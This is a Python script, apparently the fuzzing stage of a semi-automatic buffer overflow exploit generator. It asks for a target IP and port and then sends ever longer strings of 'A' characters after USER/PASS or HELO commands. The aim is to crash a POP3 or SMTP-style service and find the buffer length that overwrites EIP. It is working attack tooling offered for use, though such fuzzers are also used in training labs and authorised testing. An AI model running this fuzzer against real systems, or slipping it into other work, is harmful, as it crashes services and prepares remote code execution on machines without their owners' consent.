#!/usr/bin/python3.6
null	= """
written by coolhandsquid
Bogas
Buffer Overflow Generater Automatic Semi
"""

import socket

print("The purpose of this step is to get an idea of how much data (bytes) we need to send to break the application.")
print("If this basic fuzzer does not overwrite EIP, use SPIKE, a better fuzzer. An example .spk file is included in Bogas.")
print("Example SPIKE syntax: /usr/bin/generic_send_tcp ip port commands.spk 0 0")
print("Make sure to make and edit the commands.spk file. It must be in the /usr/bin directory.")
ipaddr	= input("What is the ip of the machine you are trying to fuzz?\n> ")
portnum	= input("What is the port number of the application you are trying to fuzz?\n> ")
portnum	= int(portnum)
service_greeting	= "PASS "
if portnum	== 25:
	service_greeting	= "HELO "
elif portnum	== 110:
	service_greeting	= "PASS "


print("""Be sure to annotate how many bytes are sent when the machine breaks.
Note- The application you are fuzzing will break and then this program will send another set of bytes. So annotate the second to last number
""")
buffer	= []
buffer.append("A")
counter	= 100
while len(buffer) <= 81:
	Add2Buff	= "A" * counter
	buffer.append(Add2Buff)
	counter	= counter + 200

for string in buffer:
	print("Fuzzing PASS with {} bytes".format(len(string)))
	#begins the process of opening a normal socket
	s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect	= s.connect((ipaddr, portnum))
	s.recv(1024)
	a	= "USER test\r\n"
	s.send(a.encode())
	s.recv(1024)
	b	= service_greeting + string + "\r\n"
	s.send(b.encode())
	c	= "QUIT\r\n"
	s.send(c.encode())
	s.close()
